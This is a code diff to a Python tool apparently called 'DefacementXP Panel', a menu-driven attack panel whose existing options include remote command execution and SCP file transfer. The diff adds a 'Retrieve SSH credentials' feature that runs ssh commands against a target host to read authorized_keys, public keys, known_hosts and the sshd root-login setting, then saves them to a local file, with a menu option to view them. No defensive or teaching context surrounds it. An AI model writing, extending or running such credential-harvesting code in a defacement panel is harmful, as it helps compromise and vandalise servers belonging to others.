@@ -34,6 +34,36 @@ def check_ssh_connection():
         print(f"{RED}Access Denied{NC}")
         return False
 
+def grab_ssh_credentials():
+    print(f"\n{YELLOW}Attempting to retrieve SSH credentials from target...{NC}")
+    try:
+        # Check for common SSH credential files
+        commands = [
+            f"ssh -p {SSH_PORT} {SSH_USER}@{TARGET_IP} 'cat ~/.ssh/authorized_keys 2>/dev/null'",
+            f"ssh -p {SSH_PORT} {SSH_USER}@{TARGET_IP} 'cat ~/.ssh/id_rsa.pub 2>/dev/null'",
+            f"ssh -p {SSH_PORT} {SSH_USER}@{TARGET_IP} 'cat ~/.ssh/known_hosts 2>/dev/null'",
+            f"ssh -p {SSH_PORT} {SSH_USER}@{TARGET_IP} 'cat /etc/ssh/sshd_config 2>/dev/null | grep -i permitrootlogin'"
+        ]
+        
+        found_creds = False
+        for cmd in commands:
+            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            if result.returncode == 0 and result.stdout.strip():
+                print(f"{GREEN}Found SSH credentials/info:{NC}")
+                print(result.stdout)
+                with open("ssh_credentials.txt", "a") as cred_file:
+                    cred_file.write(f"=== {cmd.split('cat ')[1].split(' 2')[0]} ===\n")
+                    cred_file.write(result.stdout + "\n\n")
+                found_creds = True
+        
+        if not found_creds:
+            print(f"{RED}No SSH credentials found in common locations.{NC}")
+        else:
+            print(f"{GREEN}Credentials saved to ssh_credentials.txt{NC}")
+            
+    except Exception as e:
+        print(f"{RED}Error while retrieving SSH credentials: {e}{NC}")
+
 try:
     subprocess.check_call(["which", "figlet"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 except subprocess.CalledProcessError:
@@ -125,6 +155,14 @@ def view_logs():
     except FileNotFoundError:
         print(f"{RED}No logs found.{NC}")
 
+def view_ssh_creds():
+    print(f"\n{MAGENTA}SSH Credentials Found:{NC}")
+    try:
+        with open("ssh_credentials.txt", "r") as cred_file:
+            print(cred_file.read())
+    except FileNotFoundError:
+        print(f"{RED}No SSH credentials found yet.{NC}")
+
 def menu():
     while True:
         print(f"\n{MAGENTA}DefacementXP Panel{NC}")
@@ -136,7 +174,9 @@ def menu():
         print("5. Execute remote command")
         print("6. Transfer file via SCP")
         print("7. View activity logs")
-        print("8. Exit{NC}")
+        print("8. Retrieve SSH credentials")
+        print("9. View retrieved SSH credentials")
+        print("10. Exit{NC}")
         option = input(f"{MAGENTA}Choose an option: {NC}")
         if option == "1":
             upload_file()
@@ -153,6 +193,10 @@ def menu():
         elif option == "7":
             view_logs()
         elif option == "8":
+            grab_ssh_credentials()
+        elif option == "9":
+            view_ssh_creds()
+        elif option == "10":
             sys.exit(0)
         else:
             print(f"{RED}Invalid option!{NC}")
